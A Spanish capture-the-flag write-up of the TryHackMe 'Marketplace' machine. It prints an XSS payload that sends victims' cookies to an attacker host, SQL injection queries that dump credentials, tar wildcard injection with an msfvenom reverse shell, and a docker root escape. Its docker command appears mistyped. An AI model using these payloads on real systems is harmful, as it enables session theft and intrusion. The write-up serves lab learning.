---
title: "The Marketplace - THM | by ils00"
author: ils00
categories: [TryHackMe, Medium]
tags: [web, jwt, xss, sqli, doker]
render_with_liquid: false
media_subpath: /img_p/marketplace_thm
image:
  path: logo.png
---

Esta es una de las maneras de resolver la máquina **MarketPlace** de **TryHackMe** con categoría **Media** en la plataforma.

![](maquina.png)

## Conocimientos Previos:

- Linux

- Cookies

- XSS

- Session Hajacking

- SQL Inyection

- Escalada de Privilegios Linux

- Doker (Báscio)

Después de saber todo esto, vamos a comenzar!!!

**** ESPERAR 5 MINUTOS ANTES DE EMPEZAR CON LOS ESCANEOS ****

Creamos una jerarquía de directorios para poder tenerlo todo organizado.

![](jerarquia.png)



## Escaneo de Puertos:

Primeramente, lanzamos una traza ICMP hacia la máquina víctima para ver si nos responde.

![](ping.png)

Como podemos ver el TTL de la máquina presuntamente vemos que es una máquina Linux.

Vamos con el primer escaneo de NMAP

`sudo nmap -p- --open -sS -n -Pn --min-rate 5000 -v IP_VICTIMA`

```console
PORT STATE SERVICE VERSION  
22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: | 2048 c8:3c:c5:62:65:eb:7f:5d:92:24:e9:3b:11:b5:23:b9 (RSA)  
| 256 06:b7:99:94:0b:09:14:39:e1:7f:bf:c7:5f:99:d3:9f (ECDSA)|_ 256 0a:75:be:a2:60:c6:2b:8a:df:4f:45:71:61:ab:60:b7 (ED25519)  
80/tcp open http nginx 1.19.2  
|_http-server-header: nginx/1.19.2 
| http-robots.txt: 1 disallowed entry 
|_/admin  
|_http-title: The Marketplace 
32768/tcp open http Node.js (Express middleware) 
| http-robots.txt: 1 disallowed entry |_/admin  
|_http-title: The Marketplace  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Nos da este resultado, podemos ver 3 puertos abiertos.

22 → SSH

80 → HTTP

32768 → Filenet-tms → Este puerto suele usarse para el transporte de datos entre servidores de FileNet, y su apertura puede implicar que el sistema está ejecutando servicios de gestión de documentos o procesos empresariales.

Vamos con el análisis más exhaustivo únicamente a estos puertos.

![](nmap.png)

 

## Análisis I:

Primero entramos a la página del puerto 80:

![](web.png)

Aquí vemos dos artículos y podemos ver dos usuarios potenciales llamados **Michael** y **Jake.**

Me he creado un usuario para ver como se comporta la web.

![](login.png)

Al parecer en el puerto **32768** también aparece la misma página.

## 

## Análisis II:

Vamos a hacer otra parte del análisis que es el análisis de directorios con la herramienta **gobuster**.

![](gobuster.png)

Después de esto, me pongo a analizar los directorios. Algunos aplican redirect y en otro no tengo permiso ya que requieren permisos de administrador.

Dando una vuelta por la página me puse a crear un nuevo documento en esta pestaña.

![](new.png)

Y probando cosas me di cuenta de que hay una vulnerabilidad **XSS** (Cross-Site Scripting) .

![](web1.png)

Esta es el payload que probé.

`<script> alert("1");</script>`

Y cuando lo creo me devuelve esto.

![](xss.png)

Efectivamente tenemos una vulnerabilidad **XSS**.



## Explotación I:

Para aprovecharnos de esta vulnerabilidad vamos intentar hacer un “**Session Hijacking**”. Esta técnica consiste en aprovecharse de esta vulnerabilidad XSS para inyectar código malicioso en la web.

Lo vamos a realizar mediante este pequeño payload.

`<script> var i = new Image();  i.src = "http://IP_ATTAKER:PORT/?cookie=" + btoa(document.cookie);</script>`

![](xss1.png)

En mi caso he utilizado el puerto 8000 para la escucha. Por lo tanto, me creo un servidor en python para poder realizar la escucha.

`python -m http.server 8000`

![](escucha.png)

Una vez en escucha ejecutamos el payload dándole al botón **“Submit Query”** de la web y esperamos.

![](cookie.png)

Esto es lo que me devuelve, al parecer es una cookie lo que pasa es que está encodeado en Base64.

Este es el comando para decodificarla, también se puede hacer mediante **CyberChef**.

`echo "CONTENT" | base64 -d`

![](token.png)

Hay otra manera de sacar la cookie que es mediante el **Inspector** de la página (F12), pero esto nos servirá para después.

Vamos a leer la cookie a ver que información nos puede dar.

Con **jwt.io** podemos ver el contenido de la cookie.

![](jwi.png)

Lo primero que se me ocurre es cambiar el “admin”: false por “admin”: true, pero esto no tiene efecto porque al parecer está bien securizado y, por otro lado, no tenemos la clave secreta.



## Explotación II:

Analizando la web veo que hay dos apartados dentro de listado creado anteriormente.

![](web2.png)

Cuando le doy a “Report listing to admins” aparentemente al poco tiempo de darle al report me hablan los administradores para decirme que no hay nada raro en la publicación que subido. Lo que me hace pensar que los administradores efectivamente acceden al enlace que les envío en el reporte, usando su propia sesión autenticada. Esto es importante, porque si mi payload está incrustado en esta publicación o en el enlace reportado, podría ejecutarse en el contexto de su sesión y permitirme robar su cookie de sesión.

Vamos a utilizar la misma técnica, levantamos el servidor y le damos al botón de reporte a ver que tal se comporta.

![](report.png)

![](cookie1.png)

Me da otra cookie de sesión diferente, vamos a ver que contiene.

![](jwi1.png)

Vemos que tiene otras características, tiene el “admin”: true y se llama michael, es decir, tenemos la cookie de otro usuario.

Ahora podemos nosotros loguear con esa cookie y estaríamos suplantando la identidad de otro usuario.

Vamos al “**Storage**” del navegador y cambiamos nuestra cookie por la suya. Le damos F5 y…

![](admin_web.png)

Observamos el panel del administrador.

Al entrar podremos ver la bandera número 1.

![](bandera1.png)

 

## Explotación III:

Ahora viendo la URL de la página del panel de administrador vi lo siguiente.

![](sql.png)

Que añadiendo una comilla me saltaba un error que provenía de una base de datos. Por lo que me puse a jugar con inyecciones SQL.

Vamos a empezar, voy a intentar dibujar la base de datos intentando saber cuantas columnas hay.

![](order.png)

He ido incrementando el número hasta que me de un fallo, con esto sabremos cuántas columnas tienen.

`?user=1 order by X--`

![](order1.png)

Cuando he puesto el número 5 me da fallo.

![](error_order.png)

Aquí ya me da fallo por lo que tenemos 4 columnas.

Vamos a seguir dibujando la base de datos.

Con esta query podemos ver el nombre de la base de datos.

![](database.png)

Ahora vamos a sacar las tablas de la base de datos.

`?user=123 union SELECT group_concat(table_name),2,3,4 FROM information_schema.tables WHERE table_schema ='marketplace'`

![](tablas.png)

Aquí tenemos las tablas, vamos a ver la de usuarios a ver si contiene alguna contraseña.

![](url_tablas.png)

`?user=123 union SELECT group_concat(column_name),2,3,4 FROM information_schema.columns WHERE table_schema  = database() and table_name = 'users'`

![](columas.png)

Aquí tenemos las columnas de la tabla **users**, ahora vamos a listar estas columnas. Voy a listar las columnas.

Mediante esta query vamos listar todo.

![](url_columas.png)

![](hash.png)

Aquí tenemos el hash del usuario **system**. Vamos a intentar decodificarlo.

No he podido decodificarlo así que he decidido tirar por otro lado.

Vamos a ver otra tabla, la tabla **message.**

`?user=123 union SELECT group_concat(column_name),2,3,4 FROM information_schema.columns WHERE table_schema  = database() and table_name = 'message'`

![](columas1.png)

Ahora vamos a listar todas las columnas de esta tabla.

![](url_columnas1.png)

`?user=123 union SELECT group_concat(id,user_from,user_to,message_content,is_read),2,3,4 FROM message)`

![](pass.png)

Aquí tenemos una posible contraseña, vamos a probarlos en los dos usuarios que tenemos.

![](ssh.png)

Ahí tenemos conexión con el usuario **Jake**, después del tratamiento de la TTY podemos empezar a intentar escalar privilegios.

Navegando por los directorios podemos ver la bandera de usuario.

![](bandera2.png)

## Escalada de Privilegios I:

Visualizando un poco la máquina podemos ver que haciendo un **sudo -l** vemos que podemos ejecutar un script con el usuario michel sin contraseña.

![](sudo-l.png)

El contenido del script es:

```console
#!/bin/bash  
echo "Hacking up files ...";  
tar cf /opt/backup/backup.tar *
```

Este script crea un archivo tar con todo el contenido del directorio actual. El comodín es el punto débil: hace que tar trate como argumentos a cualquier archivo que tenga nombres que parezcan opciones (prefijadas con — ).

La herramienta tar permite ejecutar comandos mientras hace backups gracias a las opciones:

- - `--checkpoint=1` → muestra el progreso cada 1 archivo
- - `--checkpoint-action=exec=CMD` → ejecuta CMD en cada punto de control

Para explotarlo:

1-. Creamos dos archivos especialmente nombrados en el directorio:

```console
touch -- '--checkpoint=1'  
touch -- '--checkpoint-action=exec=rev.sh'
```

2-. Creamos el script malicioso con **msfvenom**

`msfvenom -p cmd/unix/reverse_netcat lhost=HOST lport=LPORT`

Nos da la shell y la copiamos dentro del fichero.

`echo "SHELL" > /rev.sh`

Una vez tengamos todo creado, nos ponemos en escucha con **netcat** por el puerto que hemos puesto en la shell.

Lo ejecutamos y…

![](revshell.png)

Estamos dentro del usuario micheal.

![](https://cdn-images-1.medium.com/max/800/1*bzHcrh3iDuDtfn3Kjze6ag.png)

Tratamos la TTY y estamos listos para la escalada a root.

## Escalada de Privilegios II:

Para la escalada de privilegios del usuario michael al usuario root vamos a empezar por los más sencillo.

Vamos a ver qué privilegios tiene el usuario michael con el comando **id**.

![](id.png)

Podemos ver que somos miembros del grupo DOKER.

Vamos a informarnos sobre esto.

Entramos a GTFOBins

[https://gtfobins.github.io/gtfobins/docker/](https://gtfobins.github.io/gtfobins/docker/)

![](shell_bins.png)

`docker run -w /:/mnt --rm -it alpine chroot /mnt sh`

Vemos esta shell y vamos a probar a ejecutarlo.

![](root.png)

Somos ROOT!!

![](bandera3.png)

Aquí tenemos la bandera de root.

## Conclusión:

Es una máquina de nivel medio la cual necesita conocimientos pero no es complicada, a mi me ha llevado tiempo debido a que he tenido que probar mucho. Las horas de dedicación han sido **5h** aproximadamente, con algo de ayuda en foros y sobre todo de la IA.

Un saludo, GOOD HACKING!!!

> XIII
